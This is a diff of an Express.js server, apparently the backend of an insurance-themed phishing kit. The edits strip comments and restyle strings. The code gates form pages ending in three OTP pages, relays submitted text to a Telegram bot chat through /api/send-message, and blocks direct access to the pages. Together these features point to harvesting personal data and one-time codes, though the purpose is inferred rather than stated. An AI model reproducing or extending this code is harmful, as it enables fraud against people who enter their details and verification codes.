@@ -4,17 +4,12 @@ const dotenv = require('dotenv');
 const path = require('path');
 const crypto = require('crypto');
 
-// Load environment variables
 dotenv.config();
 
-// Generate a secure session secret if not provided
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');
 
 const app = express();
 
-// ============================================
-// Session Configuration
-// ============================================
 const session = require('express-session');
 app.use(session({
   secret: SESSION_SECRET,
@@ -23,24 +18,16 @@ app.use(session({
   cookie: {
     secure: process.env.NODE_ENV === 'production',
     httpOnly: true,
-    maxAge: 30 * 60 * 1000, // 30 minutes
+    maxAge: 30 * 60 * 1000,
     sameSite: 'strict'
   }
 }));
 
-// ============================================
-// Middleware
-// ============================================
 app.use(cors());
 app.use(express.json());
-
-// Parse URL-encoded bodies for form submissions
 app.use(express.urlencoded({ extended: true }));
-
-// Trust proxy (for secure cookies behind reverse proxy)
 app.set('trust proxy', 1);
 
-// Telegram configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -48,16 +35,12 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
   console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment.');
 }
 
-// ============================================
-// Session Step Tracking Constants
-// ============================================
 const STEPS = {
-  STEP1: 'step1_completed',    // index.html - Basic data submitted
-  STEP2: 'step2_completed',    // form1.html - Insurance data submitted
-  STEP3: 'step3_completed'    // totalselect.html - Offer selected
+  STEP1: 'step1_completed',
+  STEP2: 'step2_completed',
+  STEP3: 'step3_completed'
 };
 
-// Pages that require session step completion
 const PROTECTED_PAGES = {
   'form1.html': STEPS.STEP1,
   'totalselect.html': STEPS.STEP2,
@@ -66,63 +49,46 @@ const PROTECTED_PAGES = {
   'otp3.html': STEPS.STEP2
 };
 
-// Pages that initialize a session step
 const SESSION_INIT_PAGES = {
   'index.html': STEPS.STEP1
 };
 
-// ============================================
-// Route Protection Middleware
-// ============================================
 const routeProtection = (req, res, next) => {
   const requestedPath = req.path;
   const pageName = path.basename(requestedPath);
 
-  // Initialize session step if this page starts a step
   if (SESSION_INIT_PAGES[pageName]) {
     const stepToInit = SESSION_INIT_PAGES[pageName];
     if (!req.session.completedSteps) {
       req.session.completedSteps = {};
     }
-    // Mark this step as initiated (for step 1, it's the start)
     req.session.completedSteps[stepToInit] = true;
     req.session._currentStep = stepToInit;
     req.session.lastActivity = Date.now();
-    console.log(`[ROUTE] Session initialized for step: ${stepToInit}`);
+    console.log('[ROUTE] Session initialized for step: ' + stepToInit);
   }
 
-  // Check if page requires a previous step
   if (PROTECTED_PAGES[pageName]) {
     const requiredStep = PROTECTED_PAGES[pageName];
     
-    // Check if the required step is completed
     if (!req.session.completedSteps || !req.session.completedSteps[requiredStep]) {
-      console.log(`[ROUTE] Access denied to ${pageName}. Required step: ${requiredStep}, Session steps:`, req.session.completedSteps);
+      console.log('[ROUTE] Access denied to ' + pageName + '. Required step: ' + requiredStep);
+      console.warn('[SECURITY] Unauthorized access attempt to ' + pageName + ' from IP: ' + req.ip);
       
-      // Log attempt for security monitoring
-      console.warn(`[SECURITY] Unauthorized access attempt to ${pageName} from IP: ${req.ip}`);
-      
-      // Clear session data for security
       req.session.destroy((err) => {
         if (err) console.error('Session destroy error:', err);
       });
       
-      // Redirect to index.html
       return res.redirect('/');
     }
     
-    console.log(`[ROUTE] Access granted to ${pageName} for step: ${requiredStep}`);
+    console.log('[ROUTE] Access granted to ' + pageName + ' for step: ' + requiredStep);
     req.session.lastActivity = Date.now();
   }
 
   next();
 };
 
-// ============================================
-// Session Management API Endpoints
-// ============================================
-
-// Complete a step and advance to next
 app.post('/api/complete-step', (req, res) => {
   const { step, data } = req.body;
   
@@ -133,7 +99,6 @@ app.post('/api/complete-step', (req, res) => {
   if (STEPS[step]) {
     req.session.completedSteps[STEPS[step]] = true;
     
-    // Store any additional data for this step
     if (data) {
       if (!req.session.stepData) {
         req.session.stepData = {};
@@ -142,7 +107,7 @@ app.post('/api/complete-step', (req, res) => {
     }
     
     req.session.lastActivity = Date.now();
-    console.log(`[SESSION] Step completed: ${STEPS[step]}`);
+    console.log('[SESSION] Step completed: ' + STEPS[step]);
     
     res.json({ ok: true, message: 'Step completed', completedSteps: req.session.completedSteps });
   } else {
@@ -150,7 +115,6 @@ app.post('/api/complete-step', (req, res) => {
   }
 });
 
-// Get current session status
 app.get('/api/session-status', (req, res) => {
   res.json({
     completedSteps: req.session.completedSteps || {},
@@ -159,7 +123,6 @@ app.get('/api/session-status', (req, res) => {
   });
 });
 
-// Reset session (for logout or restart)
 app.post('/api/reset-session', (req, res) => {
   req.session.destroy((err) => {
     if (err) {
@@ -170,9 +133,6 @@ app.post('/api/reset-session', (req, res) => {
   });
 });
 
-// ============================================
-// Health Check Endpoint
-// ============================================
 app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'ok',
@@ -181,9 +141,6 @@ app.get('/api/health', (req, res) => {
   });
 });
 
-// ============================================
-// Telegram API Endpoint
-// ============================================
 app.post('/api/send-message', async (req, res) => {
   const { text, parse_mode = 'Markdown' } = req.body;
 
@@ -197,14 +154,14 @@ app.post('/api/send-message', async (req, res) => {
 
   try {
     const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text,
-          parse_mode,
+          text: text,
+          parse_mode: parse_mode,
         }),
       }
     );
@@ -222,11 +179,6 @@ app.post('/api/send-message', async (req, res) => {
   }
 });
 
-// ============================================
-// Static Files - Block Direct HTML Access
-// ============================================
-
-// List of HTML pages that should NEVER be served directly via static files
 const BLOCKED_HTML_FILES = [
   '/form1.html',
   '/totalselect.html',
@@ -236,21 +188,18 @@ const BLOCKED_HTML_FILES = [
   '/select.html'
 ];
 
-// Middleware to block direct access to protected HTML pages
 const blockDirectHtmlAccess = (req, res, next) => {
   const requestedPath = '/' + path.basename(req.path);
   
   if (BLOCKED_HTML_FILES.includes(requestedPath) || BLOCKED_HTML_FILES.includes(req.path)) {
-    console.log(`[SECURITY] Direct access blocked: ${req.path}`);
+    console.log('[SECURITY] Direct access blocked: ' + req.path);
     return res.redirect('/');
   }
   next();
 };
 
-// Apply block middleware BEFORE static files
 app.use(blockDirectHtmlAccess);
 
-// Serve public files (CSS, JS, images, etc.) - NOT HTML pages
 app.use(express.static(path.join(__dirname, 'public'), {
   index: false,
   setHeaders: (res, filePath) => {
@@ -262,59 +211,45 @@ app.use(express.static(path.join(__dirname, 'public'), {
   }
 }));
 
-// ============================================
-// Protected Routes (HTML Pages Only)
-// ============================================
-
-// Apply route protection to HTML pages - These are the ONLY way to access protected pages
 const protectedPages = ['form1.html', 'totalselect.html', 'otp.html', 'otp2.html', 'otp3.html'];
 
 protectedPages.forEach(page => {
-  app.get(`/${page}`, routeProtection, (req, res) => {
+  app.get('/' + page, routeProtection, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', page));
   });
 });
 
-// ============================================
-// Index Route
-// ============================================
 app.get('/', routeProtection, (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ============================================
-// Catch-all Route - Block all other HTML file access
-// ============================================
 app.get('*.html', (req, res) => {
-  console.log(`[SECURITY] Blocked HTML access: ${req.path}`);
+  console.log('[SECURITY] Blocked HTML access: ' + req.path);
   res.redirect('/');
 });
 
-// ============================================
-// Server Start
-// ============================================
 const BUILD_VERSION = 'v1.1.0-SECURE';
 const BUILD_DATE = new Date().toISOString();
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-  console.log('╔═══════════════════════════════════════════════════════════╗');
-  console.log('║     🌳 Tree Insurance Server - SECURE BUILD 🌳          ║');
-  console.log('╠═══════════════════════════════════════════════════════════╣');
-  console.log(`║  Version: ${BUILD_VERSION.padEnd(40)}║`);
-  console.log(`║  Build:   ${BUILD_DATE.padEnd(40)}║`);
-  console.log(`║  Port:    ${port.toString().padEnd(40)}║');
-  console.log('╠═══════════════════════════════════════════════════════════╣');
-  console.log('║  🔒 SECURITY FEATURES:                                 ║');
-  console.log('║  • Route Protection: ENABLED                          ║');
-  console.log('║  • Static HTML Block: ENABLED                        ║');
-  console.log('║  • Session Middleware: ENABLED                        ║');
-  console.log('╠═══════════════════════════════════════════════════════════╣');
-  console.log('║  Protected Pages:                                     ║');
-  console.log('║  • /form1.html       → Requires Step 1                ║');
-  console.log('║  • /totalselect.html → Requires Step 2                ║');
-  console.log('║  • /otp.html        → Requires Step 2                 ║');
-  console.log('║  • /otp2.html       → Requires Step 2                 ║');
-  console.log('║  • /otp3.html       → Requires Step 2                 ║');
-  console.log('╚═══════════════════════════════════════════════════════════╝');
+  console.log('============================================================');
+  console.log('    Tree Insurance Server - SECURE BUILD');
+  console.log('============================================================');
+  console.log('  Version: ' + BUILD_VERSION);
+  console.log('  Build:   ' + BUILD_DATE);
+  console.log('  Port:    ' + port);
+  console.log('------------------------------------------------------------');
+  console.log('  SECURITY FEATURES:');
+  console.log('  - Route Protection: ENABLED');
+  console.log('  - Static HTML Block: ENABLED');
+  console.log('  - Session Middleware: ENABLED');
+  console.log('------------------------------------------------------------');
+  console.log('  Protected Pages:');
+  console.log('  - /form1.html       -> Requires Step 1');
+  console.log('  - /totalselect.html -> Requires Step 2');
+  console.log('  - /otp.html        -> Requires Step 2');
+  console.log('  - /otp2.html       -> Requires Step 2');
+  console.log('  - /otp3.html       -> Requires Step 2');
+  console.log('============================================================');
 });
